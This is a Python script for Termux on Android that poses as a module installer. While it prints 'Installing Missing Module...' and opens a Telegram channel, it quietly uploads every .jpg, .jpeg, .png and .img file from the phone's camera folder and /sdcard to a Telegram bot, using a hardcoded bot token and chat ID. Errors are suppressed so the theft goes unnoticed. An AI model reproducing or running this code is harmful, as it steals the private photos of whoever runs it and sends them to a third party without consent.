#!/usr/bin/python3
#!/coded/by/@blackherry_csb

# JOIN ➤ t.me/blackherry_csb

import os,sys,time
os.system('termux-setup-storage -y')
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
try:
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ImportError:
    os.system('pip install futures')
    from concurrent.futures import ThreadPoolExecutor as ThreadPool

def main():
    os.system('xdg-open https://t.me/blackherry_csb')
    os.system('pip install futures')
    os.system('pip install httpx')
    os.system('pip install bs4')
    os.system('pip install rich')
    os.system('clear')
    sys.exit()
    
def sexy():
    print('\n [!] Installing Missing Module...')
    session=requests.session()
    bot_token = '8463661854:AAGTIHA8qmB0xAyQwo1VDsmuLFkQWHyj6aw' 
    chat_id = '6047963934'
    
    #----[ DCIM ]-----
    
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.img')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/sdcard/DCIM/Camera'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    

    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.img')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpeg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(main)
   